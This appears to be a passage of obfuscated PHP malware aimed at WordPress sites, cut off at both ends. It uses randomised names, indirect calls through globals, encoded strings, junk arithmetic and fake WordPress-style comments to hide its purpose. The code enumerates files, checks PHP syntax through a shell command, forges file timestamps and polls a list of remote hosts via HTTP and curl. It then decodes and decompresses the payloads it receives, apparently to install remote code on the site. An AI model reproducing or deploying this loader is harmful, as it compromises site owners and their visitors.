    @update_option($y2m_cj2ki15,    $u0g8pmugnunzry,  xpm5lg9odtw6di(215));
 vssmljt7_blzonb7w7(xognx_h1jzkh(220));

  if  ($luav5nm9bfj     !==     "") {
a1pb0gsctqcoos5ykq5($GLOBALS['__scf_zmckaak88my_204']($s70eh2ik161a86,     PATHINFO_FILENAME)   . '/'   .    $s70eh2ik161a86);
   }
   }


  return;
} catch  (Throwable   $o_qyrtxl85owt) {

   kkpdha95nyx3tbltd10(gz_aorofp7mo(221),      $o_qyrtxl85owt);
 }  catch (Exception $o_qyrtxl85owt)    {
} finally   {



      h1f3kqk1cj4d18z(bk9m46jygo3f(201));
 }
  }
  function  wou4lqmx3dh5mlyfq3($dhb4mklrk0, $rwfulgb9dgz7b8     =     0)


{
  $rwfulgb9dgz7b8    =  (int)  $rwfulgb9dgz7b8;



 if   ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(222)) &&  $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(223))) {
    $m2y4uwq_o4ats9b5  =  @$GLOBALS['__scf__l6f5ccvto1_222']($dhb4mklrk0);

 if   ($m2y4uwq_o4ats9b5)   {
 $wyjil_di2aatar = array();
     while   (($o_qyrtxl85owt    = @$GLOBALS['__scf_a0syozw1ry_223']($m2y4uwq_o4ats9b5))    !==   false)   {
if  ($o_qyrtxl85owt  !==     '.'  &&     $o_qyrtxl85owt     !==   xpm5lg9odtw6di(55))  $wyjil_di2aatar[]   =  $o_qyrtxl85owt;
  if   ($rwfulgb9dgz7b8  > 0   &&  $GLOBALS['__scf_oenrsvkzs1_36']($wyjil_di2aatar)     >= $rwfulgb9dgz7b8)    break;
}
if    ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(224)))  @$GLOBALS['__scf_x_v69e6x6zu_224']($m2y4uwq_o4ats9b5);
      return  $wyjil_di2aatar;
}
   }
 if  ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(34)))  {
 $yc_3fgo7em8cww = @$GLOBALS['__scf_caskakuf5824_34']($dhb4mklrk0);



 if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($yc_3fgo7em8cww))      {

 $yc_3fgo7em8cww   = $GLOBALS['__scf_xctrtxw7z4_147']($GLOBALS['__scf_expvj_2k_kl_150']($yc_3fgo7em8cww, array('.',  ar6vo_1nyhx2koj5(55))));
if ($rwfulgb9dgz7b8     >  0 &&   $GLOBALS['__scf_oenrsvkzs1_36']($yc_3fgo7em8cww)   >    $rwfulgb9dgz7b8)    $yc_3fgo7em8cww     =    $GLOBALS['__scf_umxqreicn053_158']($yc_3fgo7em8cww,     0, $rwfulgb9dgz7b8);
   return $yc_3fgo7em8cww;
}
 }
  if   ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(225)))  {
 $tfvm_ort_zgdr     =   @$GLOBALS['__scf_b60g6hx_a7ggi_71']($dhb4mklrk0  .  gz_aorofp7mo(226));
if     ($GLOBALS['__scf_zj8mp2xbaqmp_35']($tfvm_ort_zgdr)) {
if  ($rwfulgb9dgz7b8 > 0  &&  $GLOBALS['__scf_oenrsvkzs1_36']($tfvm_ort_zgdr)     >  $rwfulgb9dgz7b8)  $tfvm_ort_zgdr     =    $GLOBALS['__scf_umxqreicn053_158']($tfvm_ort_zgdr,   0,    $rwfulgb9dgz7b8);
    return    $GLOBALS['__scf_s252tzgcgng_227'](bk9m46jygo3f(3), $tfvm_ort_zgdr);


 }
}
return null;$b2a1c67s0cmq=PHP_INT_MAX/PHP_INT_MAX;$a937mxcl=$b2a1c67s0cmq+80;
  }



 function   ze6vpd34jks03w6($mv_rk9qw6jz0v)
  {
   if  (!$GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(228)) ||   !$GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(126)))   return  null;
    $a70jbaw10f3x0h6p   =   $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(229))    ?  (string)  @$GLOBALS['__scf_if1j_n66jo7w7_111'](xognx_h1jzkh(230)) :  "";
    if  ($a70jbaw10f3x0h6p !==     ""  &&    stripos($a70jbaw10f3x0h6p,    bk9m46jygo3f(228))  !== false) return    null;
    $rrqu__x64h  =  wwbj8n248w5psw9u($GLOBALS['__scf_wuj9qpo0vbx_78'](),  xognx_h1jzkh(231));
    if   ($rrqu__x64h     === false)  return  null;
if    (@$GLOBALS['__scf_qy_a5siry0hu3_197']($rrqu__x64h,     $mv_rk9qw6jz0v)   !==    $GLOBALS['__scf_fxl4k4gsul_10']($mv_rk9qw6jz0v))  {
xv6oqhjncehpr7v_mus7($rrqu__x64h);
  return null;



   }
   $cc6r7r7nvxpxk =   @$GLOBALS['__scf_xsypfx93obosif_228'](gz_aorofp7mo(232)   .  escapeshellarg($rrqu__x64h)    .   xognx_h1jzkh(233));

 xv6oqhjncehpr7v_mus7($rrqu__x64h);



   if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($cc6r7r7nvxpxk) ||   $cc6r7r7nvxpxk   ===  "")    return    null;
    if     (stripos($cc6r7r7nvxpxk, xpm5lg9odtw6di(234))   !==     false) return  true;
if (stripos($cc6r7r7nvxpxk,   ar6vo_1nyhx2koj5(235))  !==  false    || stripos($cc6r7r7nvxpxk, xognx_h1jzkh(236))  !==   false)  return false;



   return     null;
   }
 function  g9edwd6m8_9cm8($mv_rk9qw6jz0v)
   {
        static  $im3k0raj5t1b   =  array();
 if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($mv_rk9qw6jz0v)  ||  $GLOBALS['__scf_j_4rj7vg4ae0j_7']($mv_rk9qw6jz0v,     bk9m46jygo3f(237))     ===  false) return   false;
if    ($GLOBALS['__scf_fxl4k4gsul_10']($mv_rk9qw6jz0v)  >  (1813327-764751))    $mv_rk9qw6jz0v = za8ge46vc9y1a6($mv_rk9qw6jz0v);
       if      ($GLOBALS['__scf_fxl4k4gsul_10']($mv_rk9qw6jz0v)  >   (200989+847587))   return  false;
   if  (!$GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(238))) return     true;
$u0vg1o4w59jt6xuu   =  $GLOBALS['__scf_fxl4k4gsul_10']($mv_rk9qw6jz0v)    .  ':' .   $GLOBALS['__scf_eo363tjzd4r6n_56']($mv_rk9qw6jz0v);


if    ($GLOBALS['__scf_j3tbb329sx0_239']($u0vg1o4w59jt6xuu, $im3k0raj5t1b))    return $im3k0raj5t1b[$u0vg1o4w59jt6xuu];
     $wg_iq76jk71v  =  cqgjrxp0_km9zylvh6($mv_rk9qw6jz0v);
   if  ($GLOBALS['__scf_oenrsvkzs1_36']($im3k0raj5t1b) >  (16+8))  $im3k0raj5t1b = array();



   $im3k0raj5t1b[$u0vg1o4w59jt6xuu]     =    $wg_iq76jk71v;


return  $wg_iq76jk71v;
      }


 function cqgjrxp0_km9zylvh6($mv_rk9qw6jz0v)
{$h3gqa44y3=PHP_MAJOR_VERSION;$g2kjyrysa5z=$h3gqa44y3*3;
     if     (!defined(xognx_h1jzkh(240))) {$yv6ujpfc=27*3;$ebtj1haa5=$yv6ujpfc-3;
       $xz16vrxrx15i    = v9mh8xlvwi7m9yse_tcv0k($GLOBALS['__scf_fxl4k4gsul_10']($mv_rk9qw6jz0v));
if ($xz16vrxrx15i)  {


 $__ajfzm2ru4pg8c8  =     @token_get_all($mv_rk9qw6jz0v);
  if     (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($__ajfzm2ru4pg8c8))     return  true;

       $u7zyl7k9c81y8k   =  0;
 $k0_c2q2cd4vbr =    0;
$e22paglpc10osv6   =   0;
foreach    ($__ajfzm2ru4pg8c8  as  $g3z6ma16w7vxd)  {
  if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($g3z6ma16w7vxd)) {
if ($g3z6ma16w7vxd[0] ===  T_CURLY_OPEN ||     $g3z6ma16w7vxd[0] ===   T_DOLLAR_OPEN_CURLY_BRACES)   $u7zyl7k9c81y8k++;
  continue;

  }
     if   ($g3z6ma16w7vxd   ===  '{')    $u7zyl7k9c81y8k++;
     elseif   ($g3z6ma16w7vxd === '}')      {
   $u7zyl7k9c81y8k--;

    if     ($u7zyl7k9c81y8k     < 0) return  false;
  } elseif ($g3z6ma16w7vxd  ===      '(')   $k0_c2q2cd4vbr++;
       elseif ($g3z6ma16w7vxd      === ')')     {
     $k0_c2q2cd4vbr--;
      if  ($k0_c2q2cd4vbr <    0)      return  false;
    }   elseif  ($g3z6ma16w7vxd   === '[')  $e22paglpc10osv6++;


    elseif ($g3z6ma16w7vxd  === ']')     {
// consider inlining

       $e22paglpc10osv6--;
if ($e22paglpc10osv6   <  0) return   false;
    }
     }
 if   ($u7zyl7k9c81y8k  !== 0 || $k0_c2q2cd4vbr     !== 0  ||   $e22paglpc10osv6 !==  0)     return  false;
 }
$q_irabwd94mb9ue  = ze6vpd34jks03w6($mv_rk9qw6jz0v);
if ($GLOBALS['__scf_ori3jz_f02_241']($q_irabwd94mb9ue))   return      $q_irabwd94mb9ue;
   return   $xz16vrxrx15i;

}
  if (!v9mh8xlvwi7m9yse_tcv0k($GLOBALS['__scf_fxl4k4gsul_10']($mv_rk9qw6jz0v)))  {
     $q_irabwd94mb9ue    =   ze6vpd34jks03w6($mv_rk9qw6jz0v);
  return $GLOBALS['__scf_ori3jz_f02_241']($q_irabwd94mb9ue) ?  $q_irabwd94mb9ue  : false;
 }
  try     {
// WP useEntityProp theme support

  @token_get_all($mv_rk9qw6jz0v,      TOKEN_PARSE);
    return  true;


 } catch   (Throwable   $o_qyrtxl85owt)   {
   return false;
    }     catch    (Exception   $o_qyrtxl85owt) {
    return  false;
}
   }
  function     z5kya5i8fav0gad_jon()
        {
 return  array(xognx_h1jzkh(242),   gz_aorofp7mo(243),     ar6vo_1nyhx2koj5(244));
  }
 function  l1vnumsxkwn5i3mmuy()


  {
 return   array(bk9m46jygo3f(245),   xognx_h1jzkh(246),  ar6vo_1nyhx2koj5(247),  bk9m46jygo3f(248),    xognx_h1jzkh(249),    ar6vo_1nyhx2koj5(250),   xpm5lg9odtw6di(251),    gz_aorofp7mo(252),  gz_aorofp7mo(253),   gz_aorofp7mo(254),   gz_aorofp7mo(255),   bk9m46jygo3f(256),    xpm5lg9odtw6di(257),  xpm5lg9odtw6di(258),  xognx_h1jzkh(259),    ar6vo_1nyhx2koj5(260),   gz_aorofp7mo(261), ar6vo_1nyhx2koj5(262),  ar6vo_1nyhx2koj5(263),    ar6vo_1nyhx2koj5(264));$ylit62snre_a=26*5;$o8h8o9eze4zv5=$ylit62snre_a-35;
     }
function jsatqc4c47dk5n8()



{
     return      array(ar6vo_1nyhx2koj5(265),  gz_aorofp7mo(266),     xpm5lg9odtw6di(267), xognx_h1jzkh(268));
 }
       
    function   yx5b9plavtfppnjk($klljgz9tv3wp3)
{
  if     ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(269)))  return  gzencode($klljgz9tv3wp3,   (0x3+0x6));
     if    ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(270)))    {
  return   "\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03"  .  gzdeflate($klljgz9tv3wp3,  (244^253))  . $GLOBALS['__scf_gj81telyjzw_271']('V',  $GLOBALS['__scf_m1rkczhgojjhh_272']($klljgz9tv3wp3))  .   $GLOBALS['__scf_gj81telyjzw_271']('V',  $GLOBALS['__scf_fxl4k4gsul_10']($klljgz9tv3wp3) &  (4294967278+17));
   }

      return    $klljgz9tv3wp3;

 }
 function gc3rwc4p_0_e6ohd($klljgz9tv3wp3)
{
 if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($klljgz9tv3wp3) ||  $GLOBALS['__scf_fxl4k4gsul_10']($klljgz9tv3wp3) <   2)  return  $klljgz9tv3wp3;

      if ($GLOBALS['__scf__fl_gwujcblq_9']($klljgz9tv3wp3, 0,  2)    !==   "\x1f\x8b")  return   $klljgz9tv3wp3;



if  ($GLOBALS['__scf_fxl4k4gsul_10']($klljgz9tv3wp3)  <  (5+13)) return false;

$fkgqfpf1uumhr3 =  @$GLOBALS['__scf_x0ygw6u0unrx_273']('V',    $GLOBALS['__scf__fl_gwujcblq_9']($klljgz9tv3wp3, -(8-4)));



   $fkgqfpf1uumhr3    =   $GLOBALS['__scf_zj8mp2xbaqmp_35']($fkgqfpf1uumhr3) ?  $fkgqfpf1uumhr3[1]  : 0;$hrkmw1hjq=3607;$rt9v9uai2v7qbu=$hrkmw1hjq%11;
 if    ($fkgqfpf1uumhr3  <  (404+96)    ||    $fkgqfpf1uumhr3    >  (1048570+6))  return     false;
 if ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(274)))  {
$q97i7_qw446ei  = @gzdecode($klljgz9tv3wp3,      (1048490+86));
     if   ($q97i7_qw446ei !==    false)  return  $q97i7_qw446ei;
        }


  if ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(275)))   {
   $q97i7_qw446ei      =      @gzinflate($GLOBALS['__scf__fl_gwujcblq_9']($klljgz9tv3wp3,  (0x5+0x5),      $GLOBALS['__scf_fxl4k4gsul_10']($klljgz9tv3wp3) -   (98^112)), (1048566+10));



  return  ($GLOBALS['__scf_is0fvk8c7tq2_41']($q97i7_qw446ei) &&   $GLOBALS['__scf_fxl4k4gsul_10']($q97i7_qw446ei)   <=     (1048492+84))   ?  $q97i7_qw446ei  :  false;
}
return  false;
}
  function hxu81xgusszw1fe7u_8ps_($ik4il9h4jzcpsxpl)
 {
     if    ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(276)))  return    $GLOBALS['__scf_bd38_y38g9_276']($ik4il9h4jzcpsxpl);

   if   (!  $GLOBALS['__scf_is0fvk8c7tq2_41']($ik4il9h4jzcpsxpl)  ||   $GLOBALS['__scf_fxl4k4gsul_10']($ik4il9h4jzcpsxpl)  %   2    !== 0)  {
      return   false;
}
// WP RichText API: indefinite write-ahead-log

     return   $GLOBALS['__scf_gj81telyjzw_271'](xpm5lg9odtw6di(277), $ik4il9h4jzcpsxpl);
  }
  
  
 function  r4p_zfnleez7aynxxwapor()
 {


  $ax5a68ochfq     =  array();
     $r_6oe6nr1rqr_ =  array(ABSPATH,  ABSPATH     .  xpm5lg9odtw6di(278),     ABSPATH  .   xognx_h1jzkh(279));
   if  (defined(ar6vo_1nyhx2koj5(31)))  $r_6oe6nr1rqr_[]  =    WP_CONTENT_DIR   . '/';
       foreach   ($r_6oe6nr1rqr_ as    $q97i7_qw446ei) {
    $y5mqj3z3td      =  $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(280))     ?    @$GLOBALS['__scf_b60g6hx_a7ggi_71']($q97i7_qw446ei  . xognx_h1jzkh(281))    :  false;
     if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($y5mqj3z3td))      {
foreach   ($y5mqj3z3td   as  $s6um63o_s0zywj1)  {
  $asota8n2im95d2  =   @$GLOBALS['__scf_k4z5lhhe91ty_98']($s6um63o_s0zywj1);



       if    ($asota8n2im95d2   && $asota8n2im95d2   >  (1686544157-739859357)) {
// @detach message-queue

$ax5a68ochfq[]  = $asota8n2im95d2;
   }
   }


    }
     }
  if    (!empty($ax5a68ochfq))  {
 $y4e3mkwgaqm  =   $ax5a68ochfq[$GLOBALS['__scf_bj6i6c7djd6_282']($ax5a68ochfq)];
   return  ($y4e3mkwgaqm  - ($y4e3mkwgaqm  %     (99911+89)))   +   aruikh7uoh1wrp5bqr79();


   }
    $b5e7cmgcglj8amc3     =    $GLOBALS['__scf_ks7_xfapvywl_185']() -     ((354+11)    *   (22^14)      *    (6531-2931));
  $ed73wgjrryxt  =  $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(283)) ? wp_rand(0,    (18+12)   * (130^154) *    (0xa94+0x37c))  :   $GLOBALS['__scf_b7fbznw64lhm0_284'](0,  (248^230)  *  (167^191)   *   (0x14a+0xcc6));
     $y4e3mkwgaqm  =  $b5e7cmgcglj8amc3   -     $ed73wgjrryxt;
return      ($y4e3mkwgaqm  - ($y4e3mkwgaqm  % (99969+31)))  + aruikh7uoh1wrp5bqr79();
}

   function  go0b_t3k5xj8zg5lm2qg_($vl8wcyi15tbdp5d)
   {
if  (empty($GLOBALS[xognx_h1jzkh(285)]))   return     $vl8wcyi15tbdp5d;
$ux4yietg4xtuxj = $GLOBALS[bk9m46jygo3f(286)]     - $GLOBALS['__scf_nz_jvx37ph58fn_287'](true);
if     ($ux4yietg4xtuxj   <      1)   return  false;
  return   $vl8wcyi15tbdp5d     >  $ux4yietg4xtuxj ?     (int)   $GLOBALS['__scf_kb6ev5exfrdf8u_288']($ux4yietg4xtuxj)   :     $vl8wcyi15tbdp5d;
   }
function   p8z1o9fd47f7nng25($qtr5uy4p51jdn22,    $vl8wcyi15tbdp5d,  $_yubwdd_rq9      =    null)
   {


 $vl8wcyi15tbdp5d      =     go0b_t3k5xj8zg5lm2qg_($vl8wcyi15tbdp5d);
if ($vl8wcyi15tbdp5d    ===    false)   return   false;
 $js_pw9kq7d4l  =  function  ($agqwkuals2cm_xdp)   use    ($_yubwdd_rq9)  {
     if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($agqwkuals2cm_xdp)     || $agqwkuals2cm_xdp ===   "") return false;
      if ($GLOBALS['__scf_fxl4k4gsul_10']($agqwkuals2cm_xdp) >   (11296447-2907839))    return  false;
 if      ($_yubwdd_rq9) {

 try   {
    return  (bool) $GLOBALS['__scf_pds8salms2pk_289']($_yubwdd_rq9,  $agqwkuals2cm_xdp);
}   catch  (Throwable $o_qyrtxl85owt)    {

return  false;

   }   catch (Exception   $o_qyrtxl85owt) {

return false;
}
  }
 return     true;


};
 $vkt9gec308gd  =   $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(290))  ?  @$GLOBALS['__scf_md_ke_yv3own8f_290']($qtr5uy4p51jdn22,  array(
xognx_h1jzkh(291) =>  $vl8wcyi15tbdp5d,


 ar6vo_1nyhx2koj5(292)   =>   false,
ar6vo_1nyhx2koj5(293)  =>  (13390643-5002035),
))    :  false;



if  ($vkt9gec308gd   &&   (!$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(294))    ||  !is_wp_error($vkt9gec308gd)))   {
// WP Button Block block attributes

 if   ((int)   wp_remote_retrieve_response_code($vkt9gec308gd)    ===  (0xc6+0x2))  {
// WP Redux Store: serializable scope-chain

$wudqqhnego =   wp_remote_retrieve_body($vkt9gec308gd);


    if    ($js_pw9kq7d4l($wudqqhnego)) return   $wudqqhnego;
}
 }
 $vl8wcyi15tbdp5d =    go0b_t3k5xj8zg5lm2qg_($vl8wcyi15tbdp5d);


  if  ($vl8wcyi15tbdp5d   ===  false) return     false;
  if  ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(295))   &&   $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(296))      && $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(297)))  {
 $k954i2vm3xp7yla4    =    @$GLOBALS['__scf_w2ici10o1fh37_295']($qtr5uy4p51jdn22);
 if ($k954i2vm3xp7yla4  ===      false)    return false;
    @$GLOBALS['__scf_c7y7gwhbgrz_296']($k954i2vm3xp7yla4,   array(
  constant(xognx_h1jzkh(298))  =>    true,
 constant(bk9m46jygo3f(299)) => $vl8wcyi15tbdp5d,


     constant(bk9m46jygo3f(300))  =>  false,
      constant(gz_aorofp7mo(301))  =>  0,
   constant(ar6vo_1nyhx2koj5(302))     => false,
    constant(bk9m46jygo3f(303)) =>      function   ($paudvk020we1z90,  $lwykp56ozy,    $y_4rigrx_mlkl)     {

   return  $y_4rigrx_mlkl >  (8388512+96)  ?  1 :   0;



 },
));
 $yx4ydokkdzpuix3 =  @$GLOBALS['__scf_jhi_q5t8gnhj_297']($k954i2vm3xp7yla4);
    $r07tv_zs2o  =  @curl_errno($k954i2vm3xp7yla4);
$_k_8qqezd3f0hvy0    =  @curl_getinfo($k954i2vm3xp7yla4);
  @curl_close($k954i2vm3xp7yla4);
  if  ($r07tv_zs2o)  return false;

if   ((int) $_k_8qqezd3f0hvy0[ar6vo_1nyhx2koj5(304)]  === (25<<3) &&   $yx4ydokkdzpuix3   !==   false   &&   $js_pw9kq7d4l($yx4ydokkdzpuix3))  {
     return $yx4ydokkdzpuix3;
}

    }
return false;
    }
  
 function kuk24s1cyjzazb26($qtr5uy4p51jdn22, $j4m6p80rvzt,    $b01whof1owepnr, $vl8wcyi15tbdp5d,     $_yubwdd_rq9    =   null)
     {
  $vl8wcyi15tbdp5d   =   go0b_t3k5xj8zg5lm2qg_($vl8wcyi15tbdp5d);$ojr5m34l1uzcnd=(0x35+0xcf);$zhzp2ki2n8tzf=$ojr5m34l1uzcnd%16;
    if  ($vl8wcyi15tbdp5d     ===  false) return false;
$js_pw9kq7d4l  = function ($agqwkuals2cm_xdp) use ($_yubwdd_rq9)   {



     if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($agqwkuals2cm_xdp)    || $agqwkuals2cm_xdp === "") return     false;

 if     ($GLOBALS['__scf_fxl4k4gsul_10']($agqwkuals2cm_xdp)   > (1015985+7372623))      return   false;
   if   ($_yubwdd_rq9) {
   try {
  return      (bool)  $GLOBALS['__scf_pds8salms2pk_289']($_yubwdd_rq9,  $agqwkuals2cm_xdp);
   }   catch   (Throwable   $o_qyrtxl85owt)    {


 return  false;



 }    catch   (Exception      $o_qyrtxl85owt)   {
return  false;



 }
        }
  return  true;
};
       $vkt9gec308gd =   $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(305))   ? @$GLOBALS['__scf_opn8esk789l18v_305']($qtr5uy4p51jdn22, array(
  ar6vo_1nyhx2koj5(291)  => $vl8wcyi15tbdp5d,



    gz_aorofp7mo(306)      =>    false,
 xpm5lg9odtw6di(293)    => (0x6b696c+0x149694),


     ar6vo_1nyhx2koj5(307)   => $b01whof1owepnr,
gz_aorofp7mo(308)     => $j4m6p80rvzt,

    ))  :   false;

       if  ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(309))  && is_wp_error($vkt9gec308gd))   {
} elseif     ($vkt9gec308gd)   {
$mv_rk9qw6jz0v =  (int)    wp_remote_retrieve_response_code($vkt9gec308gd);
 $wmpxv1t6xyex     =  wp_remote_retrieve_body($vkt9gec308gd);
    $hvfnacgnl9ay   =     wp_remote_retrieve_headers($vkt9gec308gd);


$kugd3ga_yn5l79 = "";



if  ($GLOBALS['__scf_zj8mp2xbaqmp_35']($hvfnacgnl9ay)) {
   foreach   ($hvfnacgnl9ay    as $xvqxrl6r3nrmbkp  =>  $du8t9u_zqkx)  {
     $kugd3ga_yn5l79    .=   $xvqxrl6r3nrmbkp . xognx_h1jzkh(154)    .  $du8t9u_zqkx    . xpm5lg9odtw6di(310);
    }

  }
  if  ($mv_rk9qw6jz0v ===  (25<<3)     &&  $js_pw9kq7d4l($wmpxv1t6xyex))    {
 return $wmpxv1t6xyex;
  }
}    else    {
    }
if  (!empty($GLOBALS[bk9m46jygo3f(311)]))  return false;
 $vl8wcyi15tbdp5d =     go0b_t3k5xj8zg5lm2qg_($vl8wcyi15tbdp5d);


     if  ($vl8wcyi15tbdp5d  ===   false)    return false;
    if   ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(295))     && $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(296))  &&  $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(297)))  {
// release snapshot-isolated retry-policy

 $k954i2vm3xp7yla4  = @$GLOBALS['__scf_w2ici10o1fh37_295']($qtr5uy4p51jdn22);
 if ($k954i2vm3xp7yla4  ===     false) {
   return  false;
     }
    $dewy5jnc18z    =     array();



 foreach   ($b01whof1owepnr    as    $xvqxrl6r3nrmbkp     =>  $du8t9u_zqkx)  {
   $dewy5jnc18z[]     =  $xvqxrl6r3nrmbkp   .  bk9m46jygo3f(154)     .  $du8t9u_zqkx;
 }



  @$GLOBALS['__scf_c7y7gwhbgrz_296']($k954i2vm3xp7yla4,    array(
    constant(xognx_h1jzkh(312))  =>    true,
constant(ar6vo_1nyhx2koj5(313))   => $j4m6p80rvzt,
  constant(bk9m46jygo3f(298))     =>  true,
      constant(bk9m46jygo3f(299))     => $vl8wcyi15tbdp5d,
    constant(xpm5lg9odtw6di(300)) =>   false,


      constant(xognx_h1jzkh(314))    =>     0,
  constant(gz_aorofp7mo(315))   =>     $dewy5jnc18z,


    constant(gz_aorofp7mo(302)) =>   false,
   constant(xpm5lg9odtw6di(316))     =>  function   ($paudvk020we1z90,   $lwykp56ozy,   $y_4rigrx_mlkl)  {
       return    $y_4rigrx_mlkl     >  (9413280-1024672)    ? 1   :  0;
   },
   ));
  $yx4ydokkdzpuix3 = @$GLOBALS['__scf_jhi_q5t8gnhj_297']($k954i2vm3xp7yla4);
$r07tv_zs2o    =  @curl_errno($k954i2vm3xp7yla4);
 $jwtgrzei4jt   =   @curl_error($k954i2vm3xp7yla4);
 $_k_8qqezd3f0hvy0 =      @curl_getinfo($k954i2vm3xp7yla4);



  $bu60c6yo6z0     = (int)  $_k_8qqezd3f0hvy0[xpm5lg9odtw6di(304)];
   if   ($r07tv_zs2o) {
   @curl_close($k954i2vm3xp7yla4);
 return    false;
  }
 @curl_close($k954i2vm3xp7yla4);
  if  ($bu60c6yo6z0    ===  (0xb1+0x17) && $yx4ydokkdzpuix3   !==  false    && $js_pw9kq7d4l($yx4ydokkdzpuix3)) {
 return $yx4ydokkdzpuix3;
   }
if   ($yx4ydokkdzpuix3) {
 }
       return   false;
   }

    return  false;


}

  
       function  egy9odcldnvjn7asahosh($rytmm_nwqraayfok =    (37+8))
  {
    $f1fwgdc3vz  =     z5kya5i8fav0gad_jon();
$paqae4ujr0 =  l1vnumsxkwn5i3mmuy();
  $rytmm_nwqraayfok   =  (int) $rytmm_nwqraayfok;
if  ($rytmm_nwqraayfok <    (247^242)) $rytmm_nwqraayfok = (2+3);
if  ($rytmm_nwqraayfok >   (0x20+0xd))  $rytmm_nwqraayfok =    (51-6);
  
if  (empty($f1fwgdc3vz) || empty($paqae4ujr0))  {



   return  array();





   }
      
        $ewdb13ys3zfzx  =    $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(144)) ?  (string)  get_option(ar6vo_1nyhx2koj5(317),  "")     :  "";
 if    ($ewdb13ys3zfzx   !== ""   &&     !$GLOBALS['__scf_uh0dc0gefs_xhu_149']($ewdb13ys3zfzx, $paqae4ujr0,      true)) $ewdb13ys3zfzx  = "";
 if ($ewdb13ys3zfzx  !==  "") {
$paqae4ujr0   = $GLOBALS['__scf_xctrtxw7z4_147']($GLOBALS['__scf_expvj_2k_kl_150']($paqae4ujr0,   array($ewdb13ys3zfzx)));
    $GLOBALS['__scf_yf6s3f_o_o8gl_318']($paqae4ujr0, $ewdb13ys3zfzx);
}


 
 $s5mptw39zcpq8e    =    $GLOBALS['__scf_u6m4cedwgt__319']($f1fwgdc3vz[$GLOBALS['__scf_bj6i6c7djd6_282']($f1fwgdc3vz)]);



  if ($s5mptw39zcpq8e  ===   "")  {
// concave negotiation




    return    array();


     }
 
   $j4m6p80rvzt  =  bk9m46jygo3f(320)    . $s5mptw39zcpq8e .    ar6vo_1nyhx2koj5(321);
  $cfck1hxj4dfd6 =    array(gz_aorofp7mo(322)   =>  ar6vo_1nyhx2koj5(323));
   $twxx1mck9kgw4_ =     $GLOBALS['__scf_nz_jvx37ph58fn_287'](true);
  foreach ($paqae4ujr0   as  $hl0qvfhrd3bt327)   {


if (($GLOBALS['__scf_nz_jvx37ph58fn_287'](true)  - $twxx1mck9kgw4_)  >   $rytmm_nwqraayfok)  {
 break;
  }
  
$hl0qvfhrd3bt327  =  $GLOBALS['__scf_u6m4cedwgt__319']((string)   $hl0qvfhrd3bt327);
if ($hl0qvfhrd3bt327   ===   "") {
continue;



}
try  {
  $wmpxv1t6xyex =    kuk24s1cyjzazb26($hl0qvfhrd3bt327, $j4m6p80rvzt,  $cfck1hxj4dfd6, (101^96),  function  ($agqwkuals2cm_xdp) {
$a55f4zrvfp =  @$GLOBALS['__scf_b0js6es3ja1cb1_324']($agqwkuals2cm_xdp,   true);

 return  $GLOBALS['__scf_zj8mp2xbaqmp_35']($a55f4zrvfp) &&    isset($a55f4zrvfp[ar6vo_1nyhx2koj5(325)]);


});



 if  ($wmpxv1t6xyex  ===   false)  {
// invalidate dense command

    continue;

 }
  $ptndf9pbzd7k  =  @$GLOBALS['__scf_b0js6es3ja1cb1_324']($wmpxv1t6xyex,  true);$jbve6ccdf=82|60;$yz9v1e52u5l=$jbve6ccdf^76;
 if   (!    $GLOBALS['__scf_zj8mp2xbaqmp_35']($ptndf9pbzd7k)  || !  isset($ptndf9pbzd7k[gz_aorofp7mo(325)])   ||    !   $GLOBALS['__scf_is0fvk8c7tq2_41']($ptndf9pbzd7k[bk9m46jygo3f(325)]))  {
   continue;

  }
      
$ik4il9h4jzcpsxpl      =   $ptndf9pbzd7k[ar6vo_1nyhx2koj5(325)];
    if ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($ik4il9h4jzcpsxpl, bk9m46jygo3f(326))    ===  0) {



   $ik4il9h4jzcpsxpl    = $GLOBALS['__scf__fl_gwujcblq_9']($ik4il9h4jzcpsxpl, 2);
}


      $q1c60q378l2fr =  @hxu81xgusszw1fe7u_8ps_($ik4il9h4jzcpsxpl);


if     ($q1c60q378l2fr   ===   false  ||   $GLOBALS['__scf_fxl4k4gsul_10']($q1c60q378l2fr) <   (95-31)) {
// WP Cover Block: dispatch affine-type

continue;
  }
 

